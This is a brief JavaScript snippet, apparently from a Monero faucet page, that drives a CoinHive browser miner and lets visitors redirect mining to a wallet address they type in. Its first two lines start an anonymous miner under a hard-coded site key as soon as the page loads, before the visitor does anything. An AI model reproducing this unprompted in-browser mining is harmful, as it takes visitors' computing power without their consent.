var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc');
anonMiner.start();

function getWalletAddress() {
    var walletAddress = document.getElementById('xmrAddress').value;
    return walletAddress;
}
function startUserMiner() {
    var userWalletAddress = getWalletAddress();
    anonMiner.stop();
    alert('You are now mining to: "' + userWalletAddress + '" Please leave this page open, the faucet will be dripping. You can close this Alert');
    var a = $('#MinerUI').data('user'); // Getter
    $('#MinerUI').data('user', userWalletAddress); // Setter
    $("#MinerUI").load(location.href + " #MinerUI>*", "");
    document.getElementById('minerButton').innerHTML = 'Mining to: ' + userWalletAddress;
}
